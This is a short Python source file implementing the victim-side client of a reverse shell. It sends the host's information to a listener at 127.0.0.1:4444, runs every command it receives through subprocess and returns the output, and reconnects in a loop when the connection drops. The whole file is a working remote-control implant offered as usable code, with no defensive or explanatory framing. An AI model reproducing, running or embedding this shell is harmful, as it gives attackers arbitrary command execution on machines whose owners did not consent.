import socket, subprocess, os, time, json

from shell.info import get_host_info

BUFSIZE: int = 8192
ENCODING: str = 'cp866'
CONNECTION_TIMEOUT: float = 5


class Victim:
    def __init__(self, srv_ip: str, srv_port: int) -> None:
        self.srv_ip: str = srv_ip
        self.srv_port: int = srv_port
        self.info: dict = get_host_info()
        self.socket: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def handle(self, command: str) -> str:
        if command[:2] == 'cd':
            try:
                os.chdir(command[2:].strip())
                output = ' '
            except (FileNotFoundError, OSError) as err:
                output = str(err)

        else:
            output = subprocess.getoutput(command, encoding=ENCODING)

        return output

    def start(self) -> None:
        with self.socket:
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            while True:
                try:
                    self.socket.connect((self.srv_ip, self.srv_port))
                    self.socket.send(json.dumps(self.info).encode(encoding=ENCODING))

                    while True:
                        command = self.socket.recv(BUFSIZE).decode(encoding=ENCODING)
                        output = self.handle(command.strip())
                        self.socket.send(output.encode(encoding=ENCODING))

                except ConnectionError:
                    time.sleep(CONNECTION_TIMEOUT)
                    continue


victim = Victim('127.0.0.1', 4444)
victim.start()
